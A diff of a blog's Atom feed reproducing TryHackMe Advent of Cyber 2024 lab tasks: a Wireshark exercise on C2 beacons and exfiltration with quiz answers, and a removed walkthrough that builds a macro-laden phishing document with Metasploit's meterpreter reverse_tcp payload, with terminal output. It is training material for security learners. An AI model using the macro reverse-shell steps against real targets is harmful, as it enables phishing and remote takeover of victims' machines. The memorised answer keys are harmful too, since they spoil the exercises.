@@ -1,4 +1,211 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-19T22:07:05-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">THM Advent of Cyber 2024</title><subtitle>a minimalist Jekyll theme for running a blog or publication</subtitle><author><name>Michael</name></author><entry><title type="html">TryHackMe Advent of Cyber 2024 - Day 19</title><link href="http://localhost:4000/Day19" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber 2024 - Day 19" /><published>2024-12-19T00:00:00-05:00</published><updated>2024-12-19T00:00:00-05:00</updated><id>http://localhost:4000/Day19</id><content type="html" xml:base="http://localhost:4000/Day19"><![CDATA[<p>The Story</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-20T21:21:22-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">THM Advent of Cyber 2024</title><subtitle>a minimalist Jekyll theme for running a blog or publication</subtitle><author><name>Michael</name></author><entry><title type="html">TryHacneMe Advent of Cyber 2023 - Day 20</title><link href="http://localhost:4000/Day20" rel="alternate" type="text/html" title="TryHacneMe Advent of Cyber 2023 - Day 20" /><published>2024-12-20T00:00:00-05:00</published><updated>2024-12-20T00:00:00-05:00</updated><id>http://localhost:4000/Day20</id><content type="html" xml:base="http://localhost:4000/Day20"><![CDATA[<h1 id="the-story">The Story</h1>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731076103117.png" alt="Task banner for day DAY 20" /></p>
+
+<p><em>Glitch snuck through the shadows, swift as a breeze, \n He captured the traffic with delicate ease. \n A PCAP file from a system gone bad, \n Mayor Malware’s tricks made everything mad!</em></p>
+
+<p>McSkidy sat at her desk, staring at the PCAP file Glitch had just sent over. It was from Marta May Ware’s computer, the latest victim of Mayor Malware’s long-running schemes.</p>
+
+<p>She smiled, glancing at Byte. <em>“Looks like we’d have to use Wireshark again, eh boy?”</em></p>
+
+<p>Glitch’s voice crackled over the comms. <em>“Need any help analyzing it?”</em></p>
+
+<p>McSkidy smiled. “<em>Thanks, Glitch, but I’ve got this.</em>”</p>
+
+<h2 id="learning-objectives">Learning Objectives</h2>
+
+<ul>
+  <li>Investigate network traffic using Wireshark</li>
+  <li>Identify indicators of compromise (IOCs) in captured network traffic</li>
+  <li>Understand how C2 servers operate and communicate with compromised systems</li>
+</ul>
+
+<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
+
+<p>Before moving forward, review the questions in the connection card shown below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9c7574e201fe31dad228fc/room-content/5f9c7574e201fe31dad228fc-1731578412879.png" alt="Connection card" /> \n</p>
+
+<p>Start the virtual machine by pressing the <code class="language-plaintext highlighter-rouge">Start Machine</code> button below.</p>
+
+<p>Start Machine</p>
+
+<p>The machine will start in split-screen view. If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page.</p>
+
+<p>You may also access the VM via RDP using the credentials below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM key" /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Username</strong></th>
+      <th>Administrator</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Password</strong></td>
+      <td>Commandncontrol001</td>
+    </tr>
+    <tr>
+      <td><strong>IP</strong></td>
+      <td>MACHINE_IP</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="investigating-the-depths">Investigating the Depths</h2>
+
+<p><em>McSkidy peered at the PCAP with care, \n “What secrets,” she wondered, “are hiding in there?” \n With Wireshark, she’ll dig through each Byte, \n Hoping to shed some much-needed light.</em></p>
+
+<p>Before we dig deeper into Mayor Malware’s intentions, we must learn a few essential things about C2 communication. Whenever a machine is compromised, the command and control server (C2) drops its secret agent (payload) into the target machine. This secret agent is meant to obey the instructions of the C2 server. These instructions include executing malicious commands inside the target, exfiltrating essential files from the system, and much more. Interestingly, after getting into the system, the secret agent, in addition to obeying the instructions sent by the C2, has a way to keep the C2 updated on its current status. It sends a packet to the C2 every few seconds or even minutes to let it know it is active and ready to blast anything inside the target machine that the C2 aims to. These packets are known as beacons.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1729268627590.png" alt="" /></p>
+
+<p>For this room, we will be using Wireshark, an open-source tool that captures and inspects network traffic saved as a PCAP file. It’s a powerful tool, and you’ll encounter it frequently in your journey in cyber security. It is beneficial for understanding the communications between a compromised machine and a C2 server.</p>
+
+<p>If you are unfamiliar with it, here are some key capabilities you’ll see in this room:</p>
+
+<ul>
+  <li>Wireshark can analyze traffic and display the information in an easy-to-navigate format regardless of the protocols used (e.g., HTTP, TCP, DNS).</li>
+  <li>Wireshark can reconstruct back-and-forth conversations in a network.</li>
+  <li>Wireshark allows easy filtering to narrow down essential details.</li>
+  <li>Wireshark can also export and analyze objects that are transferred over the network.</li>
+</ul>
+
+<p>Of course, Wireshark has more capabilities. If you want to learn more, we suggest you visit our other Wireshark rooms:</p>
+
+<ul>
+  <li><a href="https://tryhackme.com/r/room/wiresharkthebasics">Wireshark: The Basics</a> \n</li>
+  <li><a href="https://tryhackme.com/r/room/wiresharkpacketoperations">Wireshark: Packet Operations</a> \n</li>
+  <li><a href="https://tryhackme.com/r/room/wiresharktrafficanalysis">Wireshark: Traffic Analysis</a> \n</li>
+</ul>
+
+<h2 id="diving-deeper">Diving Deeper</h2>
+
+<p>Now that we have a better idea of what C2 traffic looks like and how to use Wireshark, double-click on the file “<em>C2_Traffic_Analysis</em>” on the Desktop. This will automatically open the PCAP file using Wireshark. \n</p>
+
+<p>That’s traffic! Yes, and this would take us to the truth about Mayor Malware.</p>
+
+<p>We already suspect that this machine is compromised. So, let’s narrow down our list so that it will only show traffic coming from the IP address of Marta May Ware’s machine. To do this, click inside the <strong>Display Filter Bar</strong> on the top, type <code class="language-plaintext highlighter-rouge">ip.src == 10.10.229.217</code>, and press <strong>Enter</strong>.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1729246743949.png" alt="Display Filter Bar" /> \n</p>
+
+<p>It’s still a lot, but at least we can now focus our analysis on outbound traffic.</p>
+
+<p>If you scroll down a bit, you will find some interesting packets, specifically those highlighted with an arrow, as shown below.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1729246982740.png" alt="Highlighted packets" /> \n</p>
+
+<p>Initial? Command? Exfiltrate? That is sure to be something!</p>
+
+<p>Let’s dive deeper.</p>
+
+<h2 id="message-received">Message Received</h2>
+
+<p>If you click on the <code class="language-plaintext highlighter-rouge">POST /initial</code> packet (Frame 440), more details will be shown on the bottom panes. These panes will show more detailed information about the packet frame. It shows relevant details such as frame number (440), the destination IP (10.10.123.224), and more.</p>
+
+<p>You can expand each detail if you want, but the critical area to focus on is the lower-right view, the “Packet Bytes” pane.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1729248432169.png" alt="Packet Bytes pane" /> \n</p>
+
+<p>This pane shows the bytes used in the communication in hexadecimal and ASCII character formats. The latter format shows readable text, which can be helpful in investigations.</p>
+
+<p>The screenshot above shows something interesting: “I am in Mayor!”. This piece of text is likely relevant to us.</p>
+
+<p>If we right-click on the <code class="language-plaintext highlighter-rouge">POST /initial</code> packet (Frame 440) and select <code class="language-plaintext highlighter-rouge">Follow</code> &gt; <code class="language-plaintext highlighter-rouge">HTTP Stream</code>, a new pop-up window will appear containing the back-and-forth HTTP communication relevant to the specific session. </p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730711649896.png" alt="The initial packet" /> \n</p>
+
+<p>This feature is useful when you need to view all requests and responses between the client and the server, as it helps you understand the complete context of the communication.</p>
+
+<p>The text highlighted in red is the message sent from the source to the destination, and blue is the opposite. So, based on the screenshot above, we can see that after the message “I am in Mayor!” was sent, a response that reads “Perfect!” was sent back.</p>
+
+<p><em>Perfect</em>, indeed, Mayor. We got you now!</p>
+
+<p>But let’s not stop here. Other interesting HTTP packets were sent to the same destination IP. If you follow the HTTP Stream for the <code class="language-plaintext highlighter-rouge">GET /command</code> packet (Frame 457), you’ll see a request to the same IP destination. Interestingly, the reply that came back was a command commonly used in Windows and Linux systems to display the current user’s information. This communication suggests that the destination is attempting to gather information about the compromised system, a typical step during an early reconnaissance stage.</p>
+
+<p>Usually, the reply from a C2 server contains the command, instructing the malicious program what to do next. However, the type of instruction depends on the malicious actor’s configuration, intention, and capabilities. These instructions often fall into several categories:</p>
+
+<ol>
+  <li><strong>Getting system information:</strong> The attacker may want to know more about the compromised machine to tailor their next moves. This is what we are seeing above.</li>
+  <li><strong>Executing commands:</strong> If the attacker needs to perform specific actions, they can also send commands directly. However, this is less stealthy and easily attracts attention.</li>
+  <li><strong>Downloading and executing payloads:</strong> The attacker can also send additional payloads to the machine containing additional functionality or tools.</li>
+  <li><strong>Exfiltrating data:</strong> This is one of the most common objectives. The program may be instructed to steal valuable data such as sensitive files, credentials, or personal information.</li>
+</ol>
+
+<p>Exfiltrate sounds familiar, right?</p>
+
+<h2 id="exfiltrating-the-package">Exfiltrating the Package</h2>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1729268607259.png" alt="Picture of McSkidy" /></p>
+
+<p>If we follow the HTTP Stream for the <code class="language-plaintext highlighter-rouge">POST /exfiltrate</code> packet (Frame 476) sent to the same destination IP, we will see a file exfiltrated to the C2 server. We can also find some clues inside this file. </p>
+
+<p>If you check the rest of the PCAP, you’ll find that more interesting packets were captured. Let’s break these down and dive deeper into what we’ve uncovered.</p>
+
+<h2 id="whats-in-the-beacon">What’s in the Beacon</h2>
+
+<p>A typical C2 beacon returns regular status updates from the compromised machine to its C2 server. The beacons may be sent after regular or irregular intervals to the C2 as a heartbeat. Here’s how this exchange might look:</p>
+
+<ul>
+  <li><strong>Secret agent (payload):</strong> “I am still alive. Awaiting any instructions. Over.”</li>
+  <li><strong>C2 server:</strong> “Glad to hear that! Stand by for any further instructions. Over.”</li>
+</ul>
+
+<p>In this scenario, Mayor Malware’s agent (payload) inside Marta May Ware’s computer has sent a message that is sent inside all the beacons. Since the content is highly confidential, the secret agent encrypts it inside all the beacons, leaving a clue for the Mayor’s C2 to decrypt it. In the current scenario, we can identify the beacons by the multiple requests sent to the C2 from the target machine after regular intervals of time.</p>
+
+<p>The exfiltrated file’s content hints at how these encrypted beacons can be decrypted. Using the encryption algorithm with the provided key, we now have a potential way to unlock the beacon’s message and uncover what Mayor Malware’s agent is communicating to the C2 server.</p>
+
+<p>But what exactly are we about to reveal?</p>
+
+<p>Since the beacon is now encrypted and you have the key to decrypt it, the CyberChef tool would be our source of truth for solving this mystery. Because of its wide features, CyberChef is considered a “Swiss Army Knife”. We can use this tool for encoding, decoding, encrypting, decrypting, hashing, and much more. However, considering this task’s scope, we would only cover the decryption process using this tool.</p>
+
+<p>This <a href="https://gchq.github.io/CyberChef/">link</a> will open the CyberChef tool in your browser. <em>Note that you will have to open this link within your own browser, since the target VM has no internet connection.</em></p>
+
+<p>From the tool’s dashboard, you would be utilizing the following panes for decrypting your beacon:</p>
+
+<ol>
+  <li><strong>Operations:</strong> Search for AES Decrypt and drag it to the <strong>Recipe</strong> area, which is in the second pane.</li>
+  <li><strong>Recipe:</strong> This is the area where you would select the mode of encryption, ECB, and enter the decryption key you have. Keep the other options as they are.</li>
+  <li><strong>Input:</strong> Once the Recipe is done, it is time to enter our encrypted beacon into the <strong>Input</strong> area. Copy your encrypted string and paste it here.</li>
+  <li><strong>Output:</strong> Once you have completed the above steps, you need to click the “Bake” button in the Recipe area. Your encrypted string will be decrypted using the AES ECB decryption with the key you provided, and the output will be displayed in the <strong>Output</strong> area.</li>
+</ol>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6645aa8c024f7893371eb7ac/room-content/6645aa8c024f7893371eb7ac-1730447407462.png" alt="CyberChef" /></p>
+
+<p>If you want to learn more about CyberChef, check out our <a href="https://tryhackme.com/r/room/cyberchefbasics">CyberChef: The Basics</a> room from the <a href="https://tryhackme.com/r/path/outline/cybersecurity101">Cyber Security 101</a> path.</p>
+
+<h2 id="the-end">The End</h2>
+
+<p><em>As McSkidy opened the file with a click, \n She saw all the data—this wasn’t a wasn’t \n The storm was brewing, much bigger to come, \n Mayor Malware’s agent is far from done!</em></p>
+
+<p><em>“This isn’t just another breach,”</em> McSkidy muttered to Byte, a grim realization dawning. <em>“We’re going to need a bigger firewall.”</em></p>
+
+<h2 id="answer-the-questions-below">Answer the questions below</h2>
+
+<p>What was the first message the payload sent to Mayor Malware’s C2?</p>
+
+<p>I am in Mayor!</p>
+
+<p>What was the IP address of the C2 server?</p>
+
+<p>10.10.123.224</p>
+
+<p>What was the command sent by the C2 server to the target machine?</p>
+
+<p>whoami</p>
+
+<p>What was the filename of the critical file exfiltrated by the C2 server?</p>
+
+<p>credentials.txt</p>
+
+<p>What secret message was sent back to the C2 in an encrypted format through beacons?</p>
+
+<p>THM_Secret_101</p>
+
+<p>Learn more about WireShark in our <a href="https://tryhackme.com/r/room/wiresharktrafficanalysis">Wireshark: Traffic Analysis</a> room.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day20Header.png" /><media:content medium="image" url="http://localhost:4000/Day20Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber 2024 - Day 19</title><link href="http://localhost:4000/Day19" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber 2024 - Day 19" /><published>2024-12-19T00:00:00-05:00</published><updated>2024-12-19T00:00:00-05:00</updated><id>http://localhost:4000/Day19</id><content type="html" xml:base="http://localhost:4000/Day19"><![CDATA[<p>The Story</p>
 
 <p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732331833645.svg" alt="Task banner for day DAY 19" /></p>
 
@@ -337,7 +544,7 @@ Hello, 1!
 
 <p>THM{dont_smash_your_keyboard}</p>
 
-<p>If you liked today’s task, you can practice your skills with ”Memories of Christmas Past” from <a href="https://tryhackme.com/r/room/adventofcyber2023">Advent of Cyber 2023</a>.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary></entry><entry><title type="html">TryHackMe Advent of Cyber 2024 - Day 18</title><link href="http://localhost:4000/Day18" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber 2024 - Day 18" /><published>2024-12-18T00:00:00-05:00</published><updated>2024-12-18T00:00:00-05:00</updated><id>http://localhost:4000/Day18</id><content type="html" xml:base="http://localhost:4000/Day18"><![CDATA[<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1732101035669.png" alt="Task banner for day day 18" /></p>
+<p>If you liked today’s task, you can practice your skills with ”Memories of Christmas Past” from <a href="https://tryhackme.com/r/room/adventofcyber2023">Advent of Cyber 2023</a>.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day19Header.png" /><media:content medium="image" url="http://localhost:4000/Day19Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber 2024 - Day 18</title><link href="http://localhost:4000/Day18" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber 2024 - Day 18" /><published>2024-12-18T00:00:00-05:00</published><updated>2024-12-18T00:00:00-05:00</updated><id>http://localhost:4000/Day18</id><content type="html" xml:base="http://localhost:4000/Day18"><![CDATA[<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1732101035669.png" alt="Task banner for day day 18" /></p>
 
 <h2 id="storyline">Storyline</h2>
 
@@ -2651,296 +2858,4 @@ glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2</p>
 
 <p>fluffy/champ24</p>
 
-<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/networking">Networking</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day11Header.png" /><media:content medium="image" url="http://localhost:4000/Day11Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 10</title><link href="http://localhost:4000/Day10" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 10" /><published>2024-12-10T00:00:00-05:00</published><updated>2024-12-10T00:00:00-05:00</updated><id>http://localhost:4000/Day10</id><content type="html" xml:base="http://localhost:4000/Day10"><![CDATA[<p>The Story</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376026704.svg" alt="Task banner for day DAY 10" /></p>
-
-<p>Click here to watch the walkthrough video!</p>
-
-<p><em>Mayor Malware had one, just one SOC-mas wish:</em></p>
-
-<p><em>The SOC organiser would fall for his phish!</em></p>
-
-<p><em>Well on top of this, he wanted as well,</em></p>
-
-<p><em>Once the email opened, to gain a rev shell.</em></p>
-
-<p>\n</p>
-
-<p>Mayor Malware attempts to phish one of the SOC-mas organizers by sending a document embedded with a malicious macro. Once opened, the macro will execute, giving the Mayor remote access to the organizer’s system.</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376786068.svg" alt="Mayor Malware attempts to phish one of the SOC-mas organizers." /> \n</p>
-
-<p>Marta May Ware is surprised that her system was compromised even after following tight security, but McSkidy thinks she traced the attacker, and he got in. It’s none other than Mayor Malware who got into the system. This time, the Mayor used phishing to get his victim. McSkidy’s quick incident response prevented significant damage.</p>
-
-<p>In this task, you will run a security assessment against Marta May Ware. The purpose would be to improve her security and raise her cyber security awareness against future attacks.</p>
-
-<p>Glitch is still concerned about any future attack on Marta May Ware and advises McSkidy to run a phishing exercise on her to verify whether she is vigilant about these attacks.</p>
-
-<h2 id="learning-objectives">Learning Objectives</h2>
-
-<ul>
-  <li>Understand how phishing attacks work</li>
-  <li>Discover how macros in documents can be used and abused</li>
-  <li>Learn how to carry out a phishing attack with a macro</li>
-</ul>
-
-<h2 id="phishingattacks">Phishing Attacks</h2>
-
-<p>Security is as strong as the weakest link. Many would argue that humans are the weakest link in the security chain. Is it easier to exploit a patched system behind a firewall or to convince a user to open an “important” document? Hence, “human hacking” is usually the easiest to accomplish and falls under social engineering.</p>
-
-<p>Phishing is a play on the word fishing; however, the attacker is not after seafood. Phishing works by sending a “bait” to a usually large group of target users. Furthermore, the attacker often craft their messages with a sense of urgency, prompting target users to take immediate action without thinking critically, increasing the chances of success. The purpose is to steal personal information or install malware, usually by convincing the target user to fill out a form, open a file, or click a link.</p>
-
-<p>One might get an email out of nowhere claiming that they are being charged a hefty sum and that they should check the details in the attached file or URL. The attacker just needs to have their target users open the malicious file or view the malicious link. This can trigger specific actions that would give the attack control over your system.</p>
-
-<h2 id="macros">Macros</h2>
-
-<p>The needs of MS Office users can be vastly different, and there is no way that a default installation would cater to all of these needs. In particular, some users find themselves repeating the same tasks, such as formatting and inserting text or performing calculations. Consider the example of number-to-words conversion where a number such as “1337” needs to be expressed as “one thousand three hundred thirty-seven”. It would take hours to finish if you have hundreds of numbers to convert. Hence, there is a need for an automated solution to save time and reduce manual effort.</p>
-
-<p>In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.</p>
-
-<p>To add a macro to an MS Word document for instance, we click on the <strong>View</strong> menu and then select <strong>Macros</strong> as pointed out by 1 and 2 in the screenshot below. We should specify the name of the macro and specify that we want to save it in our current document, as indicated by 3 and 4. Finally, we press the <strong>Create</strong> button.</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859866900.png" alt="Adding a macro to an MS Word document" /> \n</p>
-
-<p>Let’s explore one way the attacker could have created an MS Word document with an embedded macro to gain access to Marta’s system.</p>
-
-<h2 id="attack-plan">Attack Plan</h2>
-
-<p>In his plans, Mayor Malware needs to create a document with a malicious macro. Upon opening the document, the macro will execute a payload and connect to the Mayor’s machine, giving him remote control. Consequently, the Mayor needs to ensure that he is listening for incoming connections on his machine before emailing the malicious document to Marta May Ware. By executing the macro, the Mayor gains remote access to Marta’s system through a reverse shell, allowing him to execute commands and control her machine remotely. The steps are as follows:</p>
-
-<ol>
-  <li>Create a document with a malicious macro</li>
-  <li>Start listening for incoming connections on the attacker’s system</li>
-  <li>Email the document and wait for the target user to open it</li>
-  <li>The target user opens the document and connects to the attacker’s system</li>
-  <li>Control the target user’s system</li>
-</ol>
-
-<p>You might wonder why you don’t set the malicious macro so that you can connect to the target system directly instead of the other way around. The reason is that when the target system is behind a firewall or has a private IP address, you cannot reach it and, hence, cannot connect to it.</p>
-
-<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
-
-<p>Before moving forward, review the questions in the connection card shown below: \n</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376755339.png" alt="We need to start the AttackBox and the attached VM" /> \n</p>
-
-<p>Press the <strong>Start Machine</strong> button below to prepare the mail server.</p>
-
-<p>Start Machine</p>
-
-<p>Click on the <strong>Start AttackBox</strong> button at the top of the page to follow along with creating this document. The AttackBox machine will start in Split-Screen view. If it is not visible, use the blue <strong>Show Split View</strong> button at the top of the page.</p>
-
-<h2 id="attackers-system">Attacker’s System</h2>
-
-<p>On the AttackBox, you need to carry out two steps:</p>
-
-<ul>
-  <li>Create a document with an embedded malicious macro</li>
-  <li>Listen for incoming connections</li>
-</ul>
-
-<h2 id="creating-the-malicious-document">Creating the Malicious Document</h2>
-
-<p>The first step would be to embed a malicious macro within the document. Alternatively, you can use the Metasploit Framework to create such a document, as this would spare us the need for a system with MS Office.</p>
-
-<p>You will use the Metasploit Framework to create the document with the malicious macro. This requires the following commands:</p>
-
-<ul>
-  <li>Open a new terminal window and run <code class="language-plaintext highlighter-rouge">msfconsole</code> to start the Metasploit Framework</li>
-  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code>specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell \n</li>
-  <li><code class="language-plaintext highlighter-rouge">use exploit/multi/fileformat/office_word_macro</code> specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro</li>
-  <li><code class="language-plaintext highlighter-rouge">set LHOST CONNECTION_IP</code> specifies the IP address of the attacker’s system, <code class="language-plaintext highlighter-rouge">CONNECTION_IP</code> in this case is the IP of the AttackBox</li>
-  <li><code class="language-plaintext highlighter-rouge">set LPORT 8888</code> specifies the port number you are going to listen on for incoming connections on the AttackBox</li>
-  <li><code class="language-plaintext highlighter-rouge">show options</code> shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example</li>
-  <li><code class="language-plaintext highlighter-rouge">exploit</code> generates a macro and embeds it in a document</li>
-  <li><code class="language-plaintext highlighter-rouge">exit</code> to quit and return to the terminal</li>
-</ul>
-
-<p>In the terminal below, you can see the execution of the above steps.</p>
-
-<p>AttackBox Terminal</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
-<span class="p">[...]</span>
-<span class="nx">Metasploit</span> <span class="nx">Documentation</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//docs.metasploit.com/</span>
-
-<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
-<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
-<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">configured</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="nx">CONNECTION_IP</span>
-<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="nx">CONNECTION_IP</span>
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">8888</span>
-<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">8888</span>
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>
-
-<span class="nx">Module</span> <span class="nf">options </span><span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">):</span>
-
-   <span class="nx">Name</span>            <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
-   <span class="o">----</span>            <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
-   <span class="nx">CUSTOMTEMPLATE</span>                   <span class="nx">no</span>        <span class="nx">A</span> <span class="nx">docx</span> <span class="nx">file</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">as</span> <span class="nx">a</span> <span class="nx">template</span> <span class="nx">to</span> <span class="nx">build</span> <span class="nx">the</span> <span class="nx">exploit</span>
-   <span class="nx">FILENAME</span>        <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>         <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">Office</span> <span class="nb">document</span> <span class="nx">macro</span> <span class="nf">file </span><span class="p">(</span><span class="nx">docm</span><span class="p">)</span>
-
-
-<span class="nx">Payload</span> <span class="nf">options </span><span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>
-
-   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
-   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
-   <span class="nx">EXITFUNC</span>  <span class="nx">thread</span>           <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nf">technique </span><span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
-   <span class="nx">LHOST</span>     <span class="nx">CONNECTION_IP</span>    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nf">address </span><span class="p">(</span><span class="nx">an</span> <span class="kr">interface</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">specified</span><span class="p">)</span>
-   <span class="nx">LPORT</span>     <span class="mi">8888</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>
-
